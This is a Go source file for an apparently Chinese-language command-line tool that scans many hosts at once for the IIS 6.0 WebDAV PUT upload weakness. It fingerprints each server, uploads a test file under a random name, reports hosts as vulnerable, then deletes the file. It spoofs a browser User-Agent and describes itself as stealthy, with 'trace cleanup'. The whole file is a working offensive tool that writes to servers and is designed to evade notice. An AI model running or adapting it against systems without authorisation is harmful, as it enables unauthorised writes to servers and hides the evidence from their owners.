package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	target      string
	targetFile  string
	outputFile  string
	concurrency int
)

// 初始化命令行参数
func init() {
	flag.StringVar(&target, "t", "", "指定单个目标 IP 或域名")
	flag.StringVar(&targetFile, "f", "", "从文件中读取目标列表")
	flag.StringVar(&outputFile, "o", "", "将结果输出到文件")
	flag.IntVar(&concurrency, "c", 10, "并发扫描数量（默认10）")
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, `IIS PUT 6.0 隐匿式漏洞扫描器（含清理痕迹）

用法:
  stealth_scanner [选项]

选项:
`)
		flag.PrintDefaults()
	}
}

func main() {
	rand.Seed(time.Now().UnixNano()) // 随机种子初始化
	flag.Parse()

	if target == "" && targetFile == "" {
		fmt.Println("错误：请使用 -t 或 -f 指定目标")
		flag.Usage()
		return
	}

	var targets []string
	if target != "" {
		targets = append(targets, target)
	}
	if targetFile != "" {
		file, err := os.Open(targetFile)
		if err != nil {
			fmt.Println("读取目标文件失败:", err)
			return
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line != "" {
				targets = append(targets, line)
			}
		}
	}

	resultChan := make(chan string, len(targets))
	sem := make(chan struct{}, concurrency)
	var wg sync.WaitGroup

	for _, t := range targets {
		wg.Add(1)
		go func(t string) {
			defer wg.Done()
			sem <- struct{}{}
			result := ScanTarget(t)
			resultChan <- result
			<-sem
		}(t)
	}

	wg.Wait()
	close(resultChan)

	if outputFile != "" {
		file, err := os.Create(outputFile)
		if err != nil {
			fmt.Println("无法写入文件:", err)
			return
		}
		defer file.Close()

		for result := range resultChan {
			fmt.Fprintln(file, result)
		}
		fmt.Println("扫描结果已保存至:", outputFile)
	} else {
		for result := range resultChan {
			fmt.Println(result)
		}
	}
}

// ScanTarget 扫描单个目标
func ScanTarget(target string) string {
	client := &http.Client{Timeout: 5 * time.Second}
	randomPath := generateRandomFilename() // 生成伪随机文件名
	url := fmt.Sprintf("http://%s%s", target, randomPath)

	// Step 1: HEAD 获取指纹
	headReq, _ := http.NewRequest("HEAD", fmt.Sprintf("http://%s/", target), nil)
	setStealthHeaders(headReq)

	headResp, err := client.Do(headReq)
	if err != nil {
		return fmt.Sprintf("[%s] [ERROR] 无法连接", target)
	}
	defer headResp.Body.Close()
	serverHeader := headResp.Header.Get("Server")
	isIIS6 := strings.Contains(serverHeader, "Microsoft-IIS/6.0")

	// Step 2: PUT 上传测试文件
	putReq, _ := http.NewRequest("PUT", url, bytes.NewBuffer([]byte("VulnTest")))
	setStealthHeaders(putReq)
	putReq.Header.Set("Content-Type", "text/plain")

	putResp, err := client.Do(putReq)
	if err != nil {
		return fmt.Sprintf("[%s] [ERROR] PUT 请求失败", target)
	}
	defer putResp.Body.Close()

	if putResp.StatusCode == 201 || putResp.StatusCode == 204 {
		// Step 3: DELETE 删除上传文件
		delReq, _ := http.NewRequest("DELETE", url, nil)
		setStealthHeaders(delReq)
		delResp, err := client.Do(delReq)
		cleaned := false
		if err == nil && (delResp.StatusCode == 200 || delResp.StatusCode == 204 || delResp.StatusCode == 404) {
			cleaned = true
		}

		status := "[VULNERABLE]"
		if !isIIS6 {
			status = "[SUSPECTED - 非 IIS6.0]"
		}
		if cleaned {
			return fmt.Sprintf("[%s] %s | Server: %s | 上传成功, 已清理 (%s)", target, status, serverHeader, randomPath)
		}
		return fmt.Sprintf("[%s] %s | Server: %s | 上传成功, 清理失败 (%s)", target, status, serverHeader, randomPath)
	}

	return fmt.Sprintf("[%s] [SAFE] | Server: %s | PUT 被拒绝 (%d)", target, serverHeader, putResp.StatusCode)
}

// setStealthHeaders 添加伪造 User-Agent
func setStealthHeaders(req *http.Request) {
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0")
}

// generateRandomFilename 生成随机文件路径
func generateRandomFilename() string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 10)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return fmt.Sprintf("/%s.txt", string(b))
}

